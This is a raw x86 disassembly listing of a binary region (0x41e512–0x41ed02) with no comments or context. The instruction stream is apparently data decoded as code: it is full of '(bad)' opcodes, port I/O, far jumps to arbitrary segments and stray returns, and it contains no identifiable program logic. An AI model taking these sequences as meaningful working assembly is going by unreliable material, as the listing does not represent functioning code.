  41e512:	out    dx,al
  41e513:	(bad)  
  41e514:	icebp  
  41e515:	cld    
  41e516:	imul   dh
  41e518:	repnz neg ch
  41e51b:	test   edx,0xd1e7c405
  41e521:	mov    esi,0x1cac9df
  41e526:	(bad)  
  41e528:	out    dx,eax
  41e529:	fistp  QWORD PTR [esi-0x1f123a42]
  41e52f:	cmc    
  41e530:	iret   
  41e531:	out    dx,eax
  41e532:	in     eax,0xea
  41e534:	not    cl
  41e536:	idiv   esi
  41e538:	rcr    edx,0xf7
  41e53b:	test   DWORD PTR [edx],0xc5fc0bcc
  41e541:	(bad)  
  41e543:	add    eax,0xe105fcc3
  41e548:	shr    BYTE PTR [eax-0x3e0d234d],cl
  41e54e:	shr    bh,0xd0
  41e551:	in     eax,0xcb
  41e553:	in     al,dx
  41e554:	iret   
  41e555:	hlt    
  41e556:	mov    ah,0xb8
  41e558:	fabs   
  41e55a:	clc    
  41e55b:	mov    eax,0xdbe1d8d3
  41e560:	hlt    
  41e561:	cmc    
  41e562:	loope  0x41e52d
  41e564:	fcom   QWORD PTR [ebx]
  41e566:	add    bh,bl
  41e568:	loopne 0x41e55c
  41e56a:	loopne 0x41e543
  41e56c:	(bad)  
  41e56e:	shl    DWORD PTR [ecx-0x12181650],cl
  41e574:	call   0xc32cb437
  41e579:	repnz xlat BYTE PTR ds:[ebx]
  41e57b:	(bad)  
  41e57c:	repnz lock idiv cl
  41e580:	mul    bh
  41e582:	retf   0x1e9
  41e585:	leave  
  41e586:	loop   0x41e58f
  41e588:	fucomip st,st(6)
  41e58a:	out    0xf6,al
  41e58c:	hlt    
  41e58d:	in     al,dx
  41e58e:	mov    ebx,0xb9d7d7d7
  41e593:	in     eax,dx
  41e594:	clc    
  41e595:	mov    dl,0xb4
  41e597:	faddp  st(1),st
  41e599:	sar    BYTE PTR [edx+ebx*8-0x2f3d18fc],cl
  41e5a0:	call   0xb0abd63
  41e5a5:	ret    0x5ff
  41e5a8:	out    dx,al
  41e5a9:	in     eax,dx
  41e5aa:	les    ebp,FWORD PTR [esi+esi*4-0x1824351e]
  41e5b1:	rol    edi,1
  41e5b3:	stc    
  41e5b4:	(bad)  
  41e5b5:	hlt    
  41e5b6:	mov    ecx,0xcedadde3
  41e5bb:	idiv   BYTE PTR [edi+eax*1-0x3f3e0843]
  41e5c2:	out    dx,al
  41e5c3:	or     eax,ebp
  41e5c5:	in     al,dx
  41e5c6:	jmp    0xf5b6:0xc6aeecf8
  41e5cd:	rcl    bl,0xb4
  41e5d0:	mov    ecx,0xefd4ecd9
  41e5d5:	repnz clc 
  41e5d7:	rcr    bh,cl
  41e5d9:	stc    
  41e5da:	int3   
  41e5db:	repnz add ebx,eax
  41e5de:	ret    
  41e5df:	or     ebp,edx
  41e5e1:	mul    ebx
  41e5e3:	or     ah,al
  41e5e5:	fcmove st,st(4)
  41e5e7:	out    dx,eax
  41e5e8:	fdivr  DWORD PTR [ebp-0x303e5318]
  41e5ee:	shr    edx,1
  41e5f0:	mov    bl,0xf2
  41e5f2:	in     al,dx
  41e5f3:	fdiv   st,st(7)
  41e5f5:	mov    ch,0xd3
  41e5f7:	enter  0xb8b8,0x3
  41e5fb:	xlat   BYTE PTR ds:[ebx]
  41e5fc:	in     eax,0xd7
  41e5fe:	std    
  41e5ff:	fdivr  st,st(3)
  41e601:	clc    
  41e602:	add    al,dh
  41e604:	int    0xe5
  41e606:	dec    BYTE PTR [edi]
  41e608:	icebp  
  41e609:	in     eax,0xe4
  41e60b:	(bad)
  41e60f:	shr    bh,cl
  41e611:	iret   
  41e612:	in     eax,dx
  41e613:	iret   
  41e614:	(bad)  
  41e615:	out    dx,eax
  41e616:	mov    ecx,0xeff4f4f0
  41e61b:	sar    BYTE PTR [ebx-0x922432f],0xe6
  41e622:	fucomi st,st(3)
  41e624:	add    DWORD PTR [edi],ecx
  41e626:	repz int3 
  41e628:	mov    esp,0xe4ace0f7
  41e62d:	lods   al,BYTE PTR ds:[esi]
  41e62e:	(bad)
  41e631:	mov    ch,0xd0
  41e633:	(bad)  
  41e635:	fdivp  st(2),st
  41e637:	mov    ecx,0x2bfde00
  41e63c:	mul    dl
  41e63e:	ret    
  41e63f:	ret    
  41e640:	(bad)  
  41e642:	loop   0x41e63c
  41e644:	out    0x1,al
  41e646:	in     al,0xc0
  41e648:	repz iret 
  41e64a:	lods   eax,DWORD PTR ds:[esi]
  41e64b:	scas   al,BYTE PTR es:[edi]
  41e64c:	retf   0xa9d7
  41e64f:	cmc    
  41e650:	in     al,dx
  41e651:	out    dx,al
  41e652:	mov    al,0xb9
  41e654:	lock shr dl,1
  41e657:	fdivrp st(6),st
  41e659:	fcmovbe st,st(3)
  41e65b:	fiadd  DWORD PTR ds:0xfb00d3bc
  41e661:	(bad)  
  41e662:	(bad)  
  41e663:	(bad)  
  41e665:	retf   0xee01
  41e668:	in     eax,0xbe
  41e66a:	fdivrp st(2),st
  41e66c:	mov    ebp,0xe6d1edaa
  41e671:	rol    ebp,cl
  41e673:	fcmovu st,st(7)
  41e675:	cli    
  41e676:	xlat   BYTE PTR ds:[ebx]
  41e677:	(bad)  
  41e678:	mov    esp,0xbefdbebf
  41e67d:	fadd   QWORD PTR ds:0x1e6c5c4
  41e683:	add    BYTE PTR [edi],al
  41e685:	add    al,0xe
  41e687:	or     ebx,eax
  41e689:	shl    DWORD PTR [edx-0x242d3338],cl
  41e68f:	int3   
  41e690:	mov    dh,0xc9
  41e692:	mov    ah,0xf5
  41e694:	rcl    edi,1
  41e696:	cld    
  41e697:	into   
  41e698:	mov    esi,0xffded1f6
  41e69d:	mov    DWORD PTR [ebx],0xddc5f0f4
  41e6a3:	push   cs
  41e6a4:	in     eax,0xfe
  41e6a6:	fucom  st(3)
  41e6a8:	in     al,dx
  41e6a9:	mov    eax,0xf1e7e4e5
  41e6ae:	in     al,0xfa
  41e6b0:	jmp    0xffd5:0xc5ceadec
  41e6b7:	std    
  41e6b8:	out    dx,al
  41e6b9:	(bad)  
  41e6bb:	int    0xbb
  41e6bd:	ret    
  41e6be:	shl    esp,1
  41e6c0:	icebp  
  41e6c1:	add    al,0xf8
  41e6c3:	cli    
  41e6c4:	cld    
  41e6c5:	or     ecx,edi
  41e6c7:	out    0xcf,eax
  41e6c9:	out    dx,eax
  41e6ca:	retf   
  41e6cb:	fsub   st(6),st
  41e6cd:	lods   al,BYTE PTR ds:[esi]
  41e6ce:	loop   0x41e687
  41e6d0:	(bad)  
  41e6d1:	jmp    0xc3b4:0xefbac4b6
  41e6d8:	cli    
  41e6d9:	mov    ecx,0xfddbbdfa
  41e6de:	add    ah,al
  41e6e0:	ret    
  41e6e1:	pop    es
  41e6e2:	call   0xfe0ae5a3
  41e6e7:	or     dl,cl
  41e6e9:	(bad)
  41e6ec:	(bad)  
  41e6ed:	not    esp
  41e6ef:	shr    BYTE PTR [edi-0x162d043c],cl
  41e6f5:	repnz mov ah,0xce
  41e6f8:	xlat   BYTE PTR ds:[ebx]
  41e6f9:	ret    
  41e6fa:	add    dh,cl
  41e6fc:	jecxz  0x41e6c3
  41e6fe:	or     eax,DWORD PTR ds:0xfdcbc9f5
  41e704:	pop    es
  41e705:	int    0xc5
  41e707:	jmp    0xe903d0c4
  41e70c:	lock repz out dx,al
  41e70f:	mov    bl,0xe7
  41e711:	(bad)
  41e714:	fadd   st(4),st
  41e716:	not    ch
  41e718:	mov    bh,0xfb
  41e71a:	push   es
  41e71b:	std    
  41e71c:	loopne 0x41e6db
  41e71e:	std    
  41e71f:	loop   0x41e72b
  41e721:	add    al,0xd9
  41e723:	add    BYTE PTR [edi],cl
  41e725:	std    
  41e726:	or     esi,edi
  41e728:	stos   BYTE PTR es:[edi],al
  41e729:	mov    al,0xe5
  41e72b:	rcr    esp,0xf7
  41e72e:	shl    ch,1
  41e730:	ror    bh,0xb1
  41e733:	mov    eax,0xdef0f9db
  41e738:	aam    0xf0
  41e73a:	(bad)  
  41e73b:	repz ret 
  41e73d:	ret    
  41e73e:	stc    
  41e73f:	out    0xf1,eax
  41e741:	loope  0x41e708
  41e743:	out    dx,eax
  41e744:	(bad)  
  41e746:	add    esi,ebx
  41e748:	int3   
  41e749:	in     al,dx
  41e74a:	lods   al,BYTE PTR ds:[esi]
  41e74b:	leave  
  41e74c:	xlat   BYTE PTR ds:[ebx]
  41e74d:	loopne 0x41e724
  41e74f:	loope  0x41e726
  41e751:	iret   
  41e752:	(bad)  
  41e753:	in     al,0xfa
  41e755:	int    0xdd
  41e757:	jmp    0xccf6:0xbefa07fc
  41e75e:	add    esp,esi
  41e760:	jmp    ecx
  41e762:	(bad)  
  41e764:	aam    0xcf
  41e766:	repnz (bad) 
  41e768:	ffreep st(6)
  41e76a:	out    dx,al
  41e76b:	in     eax,dx
  41e76c:	mov    esp,0xd1c0c6eb
  41e771:	(bad)  
  41e772:	aam    0xb5
  41e774:	retf   
  41e775:	mov    dl,0xd6
  41e777:	fnstsw WORD PTR [edx+eax*1-0xb3c1f1a]
  41e77e:	repnz out 0xd8,al
  41e781:	stc    
  41e782:	aad    0xc4
  41e784:	loope  0x41e795
  41e786:	add    al,0xb
  41e788:	ret    0xeedf
  41e78b:	shl    DWORD PTR [edx-0x9360f1b],0xef
  41e792:	(bad)  
  41e794:	hlt    
  41e795:	in     eax,dx
  41e796:	mov    ch,0xf0
  41e798:	in     al,dx
  41e799:	in     al,dx
  41e79a:	rcl    eax,1
  41e79c:	ror    BYTE PTR [ebx],cl
  41e79e:	sti    
  41e79f:	or     bl,cl
  41e7a1:	jmp    0xe704ed6c
  41e7a6:	in     al,dx
  41e7a7:	loope  0x41e771
  41e7a9:	in     al,dx
  41e7aa:	int    0xc6
  41e7ac:	cmc    
  41e7ad:	ror    ch,cl
  41e7af:	in     al,dx
  41e7b0:	clc    
  41e7b1:	mov    edx,0xdbd0e9d3
  41e7b6:	mov    ah,0xc9
  41e7b8:	(bad)  
  41e7ba:	mov    esp,0xd9c5bdf6
  41e7bf:	idiv   ebp
  41e7c1:	fmul   st,st(0)
  41e7c3:	(bad)  
  41e7c4:	out    0xfc,eax
  41e7c6:	out    0xfa,al
  41e7c8:	mov    eax,0xe2c0cbca
  41e7cd:	out    0xc7,al
  41e7cf:	jmp    0xf817d283
  41e7d4:	in     eax,0xec
  41e7d6:	out    dx,al
  41e7d7:	mov    ah,0xfa
  41e7d9:	xlat   BYTE PTR ds:[ebx]
  41e7da:	cld    
  41e7db:	int    0xe5
  41e7dd:	neg    ebx
  41e7df:	(bad)  
  41e7e0:	or     DWORD PTR [edx],eax
  41e7e2:	fsubrp st(1),st
  41e7e4:	out    0xe,eax
  41e7e6:	retf   
  41e7e7:	std    
  41e7e8:	in     eax,0xc3
  41e7ea:	fbstp  TBYTE PTR [ebx-0x4f4b4c36]
  41e7f0:	shl    DWORD PTR [ebp-0xc002c53],0xe2
  41e7f7:	out    dx,al
  41e7f8:	mov    ecx,0xd3c7ded9
  41e7fd:	xlat   BYTE PTR ds:[ebx]
  41e7fe:	rcr    eax,0xfe
  41e801:	or     ebp,esi
  41e803:	iret   
  41e804:	or     ebp,edi
  41e806:	clc    
  41e807:	retf   0xccc4
  41e80a:	test   eax,0xcbc0e1e8
  41e80f:	in     eax,0xfa
  41e811:	int    0xc7
  41e813:	in     eax,0xc8
  41e815:	retf   0xbff3
  41e818:	cmc    
  41e819:	shr    ah,1
  41e81b:	rcr    ecx,0xd5
  41e81e:	mov    esp,0x401d1d1
  41e823:	fxch   st(0)
  41e825:	in     al,0x6
  41e827:	or     cl,bl
  41e829:	rol    esp,cl
  41e82b:	rep lods eax,DWORD PTR ds:[esi]
  41e82d:	out    dx,eax
  41e82e:	retf   0xe6f0
  41e831:	mov    ch,0xc9
  41e833:	jmp    0xd7de:0xc8ccc8b7
  41e83a:	mov    edi,0xd5d8d4e3
  41e83f:	ret    
  41e840:	push   es
  41e841:	retf   0xc905
  41e844:	or     al,0x9
  41e846:	pop    es
  41e847:	in     eax,dx
  41e848:	out    0xea,eax
  41e84a:	(bad)  
  41e84b:	in     eax,dx
  41e84c:	loope  0x41e7fa
  41e84e:	mov    dh,0xeb
  41e850:	repnz retf 0xd7b5
  41e854:	in     eax,0xf7
  41e856:	iret   
  41e857:	repz add bh,bh
  41e85a:	fadd   st,st(2)
  41e85c:	(bad)  
  41e85e:	jecxz  0x41e838
  41e860:	out    0x0,al
  41e862:	clc    
  41e863:	vpmulhw xmm1,xmm0,xmm4
  41e867:	loopne 0x41e827
  41e869:	in     eax,0xf6
  41e86b:	repnz mov bl,0xf6
  41e86e:	mov    dl,0xb3
  41e870:	(bad)  
  41e871:	mov    bh,0xc8
  41e873:	iret   
  41e874:	fcos   
  41e876:	into   
  41e877:	loop   0x41e832
  41e879:	out    0xfa,eax
  41e87b:	push   es
  41e87c:	xlat   BYTE PTR ds:[ebx]
  41e87d:	clc    
  41e87e:	pop    es
  41e87f:	xbegin 0xf035f394
  41e885:	stc    
  41e886:	adc    cl,al
  41e888:	repz jmp 0xfbce:0xe7e3cbb3
  41e890:	out    dx,eax
  41e891:	int3   
  41e892:	mov    ah,0xd9
  41e894:	fdivr  QWORD PTR [ebx-0x27313732]
  41e89a:	ret    0xd0f5
  41e89d:	fcmovu st,st(4)
  41e89f:	(bad)
  41e8a3:	in     eax,dx
  41e8a4:	inc    BYTE PTR [eax]
  41e8a6:	out    0xd,al
  41e8a8:	mov    dl,0xc1
  41e8aa:	(bad)  
  41e8ab:	(bad)  
  41e8ac:	mov    bl,0xae
  41e8ae:	sti    
  41e8af:	leave  
  41e8b0:	jmp    0xbcfe:0xffcfd2e5
  41e8b7:	mov    edx,0xf2f4fdbe
  41e8bc:	clc    
  41e8bd:	int3   
  41e8be:	or     cl,bl
  41e8c0:	add    BYTE PTR [edx],cl
  41e8c2:	jmp    0xf0df:0x6e3ecda
  41e8c9:	int    0xe2
  41e8cb:	ret    0xc3f7
  41e8ce:	div    BYTE PTR [esi+ecx*8-0x60a050f]
  41e8d5:	mov    dh,0xbf
  41e8d7:	jmp    0x1b1d6
  41e8dc:	repz xlat BYTE PTR ds:[ebx]
  41e8de:	sar    esi,0xf9
  41e8e1:	or     esp,esp
  41e8e3:	(bad)  
  41e8e4:	enter  0xcfb,0xce
  41e8e8:	jmp    0xbd35cebc
  41e8ed:	lods   eax,DWORD PTR ds:[esi]
  41e8ee:	repnz int3 
  41e8f0:	jmp    0x41e8de
  41e8f2:	aam    0xfb
  41e8f4:	mov    bh,0xea
  41e8f6:	call   0xdc3fc7af
  41e8fb:	hlt    
  41e8fc:	pop    es
  41e8fd:	out    0xf8,eax
  41e8ff:	mov    eax,0xdf01f8d0
  41e904:	out    dx,al
  41e905:	add    ebp,esi
  41e907:	iret   
  41e908:	fbstp  TBYTE PTR [ecx-0x4a193c4d]
  41e90e:	ret    0xb5e7
  41e911:	(bad)  
  41e912:	mov    ecx,0xdbe8ddc8
  41e917:	sar    BYTE PTR [ecx+0x6f6e2cf],cl
  41e91d:	(bad)  
  41e91f:	pop    es
  41e920:	or     bl,ah
  41e922:	clc    
  41e923:	cli    
  41e924:	(bad)  
  41e926:	les    eax,FWORD PTR [ebx]
  41e928:	ret    0xa8d2
  41e92b:	fsubp  st(5),st
  41e92d:	(bad)  
  41e92e:	loopne 0x41e8f1
  41e930:	shl    DWORD PTR [edi-0x90e480b],0xb5
  41e937:	(bad)  
  41e938:	cli    
  41e939:	cmc    
  41e93a:	clc    
  41e93b:	inc    DWORD PTR [edx]
  41e93d:	lock hlt 
  41e93f:	add    dl,al
  41e941:	faddp  st(4),st
  41e943:	loopne 0x41e953
  41e945:	(bad)  
  41e946:	or     ebp,eax
  41e948:	in     al,dx
  41e949:	int3   
  41e94a:	test   al,0xcb
  41e94c:	shl    esp,0xed
  41e94f:	xlat   BYTE PTR ds:[ebx]
  41e950:	in     eax,dx
  41e951:	mov    bh,0xce
  41e953:	aam    0xdc
  41e955:	repz loop 0x41e956
  41e958:	into   
  41e959:	idiv   BYTE PTR [eax-0x63a120b]
  41e95f:	mov    eax,0xd908c4ca
  41e964:	std    
  41e965:	enter  0xfcc,0xc0
  41e969:	shl    cl,1
  41e96b:	faddp  st(2),st
  41e96d:	mov    bl,0xfa
  41e96f:	mov    ebp,0xccb5f5d0
  41e975:	cli    
  41e976:	mov    esp,0xdabef2dc
  41e97b:	in     eax,0xc1
  41e97d:	in     al,dx
  41e97e:	(bad)  
  41e980:	std    
  41e981:	or     DWORD PTR [edx],ecx
  41e983:	cmc    
  41e984:	inc    ah
  41e986:	enter  0xa8fd,0xc0
  41e98a:	shr    ch,cl
  41e98c:	shl    ah,1
  41e98e:	ret    
  41e98f:	out    dx,eax
  41e990:	out    dx,eax
  41e991:	call   0xea21de5a
  41e996:	(bad)  
  41e998:	cld    
  41e999:	(bad)  
  41e99a:	clc    
  41e99b:	lock (bad) 
  41e99d:	clc    
  41e99e:	fmul   DWORD PTR [ebx]
  41e9a0:	mov    edi,0xcd0ec905
  41e9a5:	out    dx,eax
  41e9a6:	retf   
  41e9a7:	call   0xee1ecd54
  41e9ac:	retf   
  41e9ad:	jmp    0xbb139685
  41e9b2:	repnz mov edx,0xf4d2ded2
  41e9b8:	call   0xbd40ddae
  41e9bd:	out    0xd6,al
  41e9bf:	in     eax,0xdb
  41e9c1:	les    eax,FWORD PTR [ecx]
  41e9c3:	out    0xf9,eax
  41e9c5:	sti    
  41e9c6:	fcmove st,st(1)
  41e9c8:	(bad)
  41e9cb:	scas   al,BYTE PTR es:[edi]
  41e9cc:	into   
  41e9cd:	jmp    0xe4e8:0xb1b0d1eb
  41e9d4:	icebp  
  41e9d5:	(bad)  
  41e9d7:	add    eax,esp
  41e9d9:	int    0xd2
  41e9db:	aam    0xd5
  41e9dd:	mov    esi,0xfff90004
  41e9e2:	out    0xf6,eax
  41e9e4:	fsubr  st(3),st
  41e9e6:	iret   
  41e9e7:	in     eax,0xee
  41e9e9:	repnz loop 0x41e9b7
  41e9ec:	(bad)  
  41e9ed:	lods   al,BYTE PTR ds:[esi]
  41e9ee:	rcl    edx,0xd2
  41e9f1:	in     al,dx
  41e9f2:	mov    edx,0xfbd0bfd6
  41e9f7:	in     eax,dx
  41e9f8:	fistp  QWORD PTR [ebp-0x2f3a3827]
  41e9fe:	clc    
  41e9ff:	aam    0xbf
  41ea01:	or     ch,bh
  41ea03:	cli    
  41ea04:	in     al,0xc2
  41ea06:	(bad)
  41ea0a:	fisubr WORD PTR [edi-0x324c362b]
  41ea10:	loopne 0x41e9c8
  41ea12:	mov    ah,0xbb
  41ea14:	repz mov ah,0xfd
  41ea17:	sar    ah,cl
  41ea19:	mov    eax,0xdfd4e502
  41ea1e:	rol    dl,cl
  41ea20:	fucom  st(2)
  41ea22:	out    dx,al
  41ea23:	loope  0x41ea2c
  41ea25:	add    BYTE PTR ds:0xd2f7bd08,al
  41ea2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea2c:	jmp    0xeadf:0xe0f3b7f2
  41ea33:	retf   
  41ea34:	int    0xcd
  41ea36:	(bad)  
  41ea37:	mov    ebx,0xfcc7d3cc
  41ea3c:	cmc    
  41ea3d:	(bad)  
  41ea3e:	cli    
  41ea3f:	(bad)  
  41ea41:	retf   
  41ea42:	inc    DWORD PTR [eax]
  41ea44:	int    0xd8
  41ea46:	in     eax,dx
  41ea47:	clc    
  41ea48:	mov    cl,0xc0
  41ea4a:	div    edi
  41ea4c:	retf   
  41ea4d:	shl    al,0xe2
  41ea50:	loopne 0x41ea43
  41ea52:	call   ecx
  41ea54:	int    0xb8
  41ea56:	mov    ebx,0xf3d6f1ce
  41ea5b:	rol    al,cl
  41ea5d:	in     al,dx
  41ea5e:	test   BYTE PTR [ebx],0xe2
  41ea61:	add    al,al
  41ea63:	push   es
  41ea64:	(bad)
  41ea68:	lock scas eax,DWORD PTR es:[edi]
  41ea6a:	vcmpsd xmm6,xmm5,xmm4,0xd7
  41ea6f:	jmp    0xc62eb241
  41ea74:	rcr    al,1
  41ea76:	enter  0xc2ea,0xf1
  41ea7a:	mov    ebp,0xf404c3db
  41ea7f:	retf   
  41ea80:	(bad)  
  41ea81:	fld    st(6)
  41ea83:	rcr    dl,0xe7
  41ea86:	jmp    0x41ea6b
  41ea88:	test   eax,0xcac7afa9
  41ea8d:	lock div DWORD PTR [edi-0x451a2e15]
  41ea94:	fcmovnbe st,st(4)
  41ea96:	(bad)  
  41ea97:	mov    eax,0xbe01b800
  41ea9c:	rol    bh,1
  41ea9e:	rcl    esp,1
  41eaa0:	or     ebp,eax
  41eaa2:	cmc    
  41eaa3:	(bad)  
  41eaa5:	push   cs
  41eaa6:	add    BYTE PTR [edi+eax*8],al
  41eaa9:	jmp    0xcce0:0xccd7d2cd
  41eab0:	aam    0xb5
  41eab2:	cmc    
  41eab3:	mov    esi,0xccd0b2f5
  41eab8:	add    edi,edi
  41eaba:	shl    dh,0xff
  41eabd:	mov    esp,0xe8e6d0c3
  41eac2:	cli    
  41eac3:	enter  0xfa04,0xd
  41eac7:	retf   0xccef
  41eaca:	test   al,0xf5
  41eacc:	in     eax,0xe1
  41eace:	cli    
  41eacf:	mov    dh,0xf7
  41ead1:	mov    dh,0xd9
  41ead3:	jmp    0x41ea8c
  41ead5:	clc    
  41ead6:	(bad)  
  41ead8:	aam    0xf3
  41eada:	pop    es
  41eadb:	add    eax,0xe50bddc5
  41eae0:	in     eax,0xeb
  41eae2:	enter  0xeac7,0xef
  41eae6:	push   es
  41eae7:	or     dh,dl
  41eae9:	sar    DWORD PTR [edi-0xf4a512d],0xba
  41eaf0:	in     al,0xd5
  41eaf2:	repnz cli 
  41eaf4:	imul   esi
  41eaf6:	iret   
  41eaf7:	mov    ah,0xbf
  41eaf9:	in     al,dx
  41eafa:	mov    ch,0xe6
  41eafc:	xlat   BYTE PTR ds:[ebx]
  41eafd:	repnz add bh,ah
  41eb00:	pop    es
  41eb01:	add    eax,0xcaef08c0
  41eb06:	ud0    eax,esi
  41eb09:	into   
  41eb0a:	in     eax,0xca
  41eb0c:	stos   DWORD PTR es:[edi],eax
  41eb0d:	out    0xf4,al
  41eb0f:	mov    bl,0xc5
  41eb11:	int3   
  41eb12:	int3   
  41eb13:	(bad)  
  41eb14:	mov    ebx,0xdecfd7bc
  41eb19:	pop    es
  41eb1a:	mov    ecx,0x406d7e2
  41eb1f:	out    0xea,al
  41eb21:	add    eax,0x13eec5e4
  41eb26:	add    ebp,ebp
  41eb28:	(bad)  
  41eb29:	enter  0xe3a5,0xc6
  41eb2d:	repnz aad 0xef
  41eb30:	xlat   BYTE PTR ds:[ebx]
  41eb31:	int3   
  41eb32:	out    dx,eax
  41eb33:	call   0xbe30a402
  41eb38:	shl    bl,1
  41eb3a:	into   
  41eb3b:	fadd   QWORD PTR [ebx]
  41eb3d:	repz add ch,ah
  41eb40:	sti    
  41eb41:	retf   
  41eb42:	mov    ebp,0xe1ebcff8
  41eb47:	std    
  41eb48:	rcl    eax,0xef
  41eb4b:	test   ebp,0xc9b2cfbc
  41eb51:	int3   
  41eb52:	out    0xbb,eax
  41eb54:	(bad)  
  41eb55:	std    
  41eb56:	retf   
  41eb57:	(bad)  
  41eb58:	test   dl,0xc0
  41eb5b:	(bad)  
  41eb5d:	loope  0x41eb22
  41eb5f:	(bad)
  41eb62:	(bad)  
  41eb63:	jmp    0xd250ff37
  41eb68:	stos   DWORD PTR es:[edi],eax
  41eb69:	loopne 0x41eb54
  41eb6b:	int3   
  41eb6c:	shl    ch,0xd7
  41eb6f:	jmp    0x41eb48
  41eb71:	(bad)  
  41eb72:	(bad)  
  41eb73:	out    dx,al
  41eb74:	mov    bh,0xec
  41eb76:	out    dx,eax
  41eb77:	aad    0x2
  41eb79:	(bad)  
  41eb7b:	mov    ah,0xc5
  41eb7d:	jecxz  0x41eb73
  41eb7f:	push   es
  41eb80:	add    al,0xfe
  41eb82:	in     al,0xda
  41eb84:	cmc    
  41eb85:	out    dx,al
  41eb86:	or     ecx,DWORD PTR [esi]
  41eb88:	lock in eax,0xbd
  41eb8b:	lods   eax,DWORD PTR ds:[esi]
  41eb8c:	stos   DWORD PTR es:[edi],eax
  41eb8d:	(bad)  
  41eb8e:	in     eax,0xc5
  41eb90:	jmp    0x41eb49
  41eb92:	lock out dx,al
  41eb94:	mov    bl,0xf6
  41eb96:	mov    esi,0xdbdae8be
  41eb9b:	fnop   
  41eb9d:	aam    0xff
  41eb9f:	repnz mov edi,0xfa08daf0
  41eba5:	clc    
  41eba6:	or     BYTE PTR [edx],cl
  41eba8:	mov    esp,0xeac4f2d3
  41ebad:	loop   0x41eb97
  41ebaf:	ret    0xf5f8
  41ebb2:	idiv   ch
  41ebb4:	mov    ch,0xde
  41ebb6:	fsqrt  
  41ebb8:	loop   0x41eb88
  41ebba:	out    dx,eax
  41ebbb:	in     al,dx
  41ebbc:	loopne 0x41ebc0
  41ebbe:	aad    0xd5
  41ebc0:	out    0xca,al
  41ebc2:	xlat   BYTE PTR ds:[ebx]
  41ebc3:	retf   
  41ebc4:	iret   
  41ebc5:	push   es
  41ebc6:	adc    edx,edx
  41ebc8:	fucomp st(0)
  41ebca:	(bad)  
  41ebcb:	(bad)  
  41ebcc:	repnz out 0xca,al
  41ebcf:	retf   0xf0d5
  41ebd2:	out    dx,al
  41ebd3:	jmp    0xba24cace
  41ebd8:	fdiv   st(4),st
  41ebda:	repnz add eax,DWORD PTR [esi]
  41ebdd:	rcl    cl,cl
  41ebdf:	pop    es
  41ebe0:	add    edi,edi
  41ebe2:	jmp    0xf928b7bd
  41ebe7:	fldcw  WORD PTR [ecx-0x4a0d3e4e]
  41ebed:	mov    ah,0xb3
  41ebef:	loopne 0x41ebbe
  41ebf1:	aam    0xf6
  41ebf3:	hlt    
  41ebf4:	iret   
  41ebf5:	call   0xd33c9cb5
  41ebfa:	std    
  41ebfb:	mul    eax
  41ebfd:	mov    dl,0xc3
  41ec00:	push   es
  41ec01:	fdivr  st,st(2)
  41ec03:	std    
  41ec04:	out    0xa,al
  41ec06:	adc    edx,DWORD PTR [ecx]
  41ec08:	mov    bl,0xeb
  41ec0a:	mov    esp,0xc3e1c5ec
  41ec0f:	(bad)  
  41ec11:	mov    dl,0xd0
  41ec13:	sar    ebx,cl
  41ec15:	jmp    0x41ebe1
  41ec17:	loop   0x41ebd7
  41ec19:	jecxz  0x41ebda
  41ec1b:	fild   WORD PTR [ebx]
  41ec1d:	mov    esi,0xfdfd9d9
  41ec22:	leave  
  41ec23:	add    DWORD PTR [edx],eax
  41ec25:	(bad)  
  41ec27:	icebp  
  41ec28:	in     eax,0xe4
  41ec2a:	mov    dl,0xe9
  41ec2c:	lods   eax,DWORD PTR ds:[esi]
  41ec2d:	mov    bh,0xc8
  41ec2f:	mov    bl,0xe1
  41ec31:	lock in al,dx
  41ec33:	rcr    edi,1
  41ec35:	idiv   DWORD PTR [edx+edi*8-0xc280737]
  41ec3c:	repz idiv ecx
  41ec3f:	imul   al
  41ec41:	jmp    0x129cf4a
  41ec46:	out    dx,al
  41ec47:	or     ecx,eax
  41ec49:	scas   eax,DWORD PTR es:[edi]
  41ec4a:	leave  
  41ec4b:	retf   
  41ec4c:	aam    0xeb
  41ec4e:	int3   
  41ec4f:	shl    ebx,1
  41ec51:	enter  0xbfff,0xc9
  41ec55:	mov    esp,0xf5faffe9
  41ec5a:	mov    edi,0xe5bcf403
  41ec5f:	cld    
  41ec60:	(bad)
  41ec63:	leave  
  41ec64:	paddw  mm7,mm7
  41ec67:	jecxz  0x41ec4a
  41ec69:	test   ebx,0xc9c2c3e2
  41ec6f:	(bad)  
  41ec70:	fdiv   st,st(5)
  41ec72:	(bad)  
  41ec73:	(bad)  
  41ec75:	mov    edi,0xf6cef4f2
  41ec7a:	(bad)  
  41ec7c:	(bad)  
  41ec7d:	in     al,0x7
  41ec7f:	jecxz  0x41ec83
  41ec81:	call   0xcf1bef6d
  41ec86:	rcr    ecx,cl
  41ec88:	mov    esi,0xd0b1e0aa
  41ec8d:	stos   BYTE PTR es:[edi],al
  41ec8e:	int    0xc9
  41ec90:	retf   
  41ec91:	(bad)  
  41ec93:	idiv   BYTE PTR [edi-0x3d00324a]
  41ec99:	out    dx,al
  41ec9a:	mov    ch,0xcd
  41ec9c:	div    dl
  41ec9e:	fild   DWORD PTR [edx*8-0x61a03fd]
  41eca5:	add    al,0xe2
  41eca7:	loope  0x41ec9b
  41eca9:	jecxz  0x41ec77
  41ecab:	shl    edi,0xe9
  41ecae:	(bad)  
  41ecaf:	mov    ch,0xc5
  41ecb1:	div    esi
  41ecb3:	les    edi,FWORD PTR [ecx-0x48000713]
  41ecb9:	mov    ecx,0xf9bfbff8
  41ecbe:	(bad)
  41ecc2:	fiadd  WORD PTR [eax]
  41ecc4:	add    edx,ecx
  41ecc6:	(bad)  
  41ecc7:	in     eax,dx
  41ecc8:	out    0xc0,al
  41ecca:	mov    al,0xe5
  41eccc:	leave  
  41eccd:	(bad)  
  41ecce:	in     eax,dx
  41eccf:	mov    dl,0xf5
  41ecd1:	out    0xf5,al
  41ecd3:	mov    eax,0xfef903c4
  41ecd8:	mov    edx,0xedf1d5e3
  41ecdd:	(bad)  
  41ecde:	rol    edx,cl
  41ece0:	ret    
  41ece1:	aam    0xe7
  41ece3:	sti    
  41ece4:	(bad)  
  41ece6:	in     al,dx
  41ece7:	cld    
  41ece8:	into   
  41ece9:	out    dx,al
  41ecea:	sar    DWORD PTR [ebp-0x2f041a15],1
  41ecf0:	fdivr  st,st(0)
  41ecf2:	repz iret 
  41ecf4:	enter  0xe9ba,0xbb
  41ecf8:	int3   
  41ecf9:	fidivr WORD PTR [edi-0x1f0d2605]
  41ecff:	cli    
  41ed00:	add    dh,ah
  41ed02:	out    0xbc,al
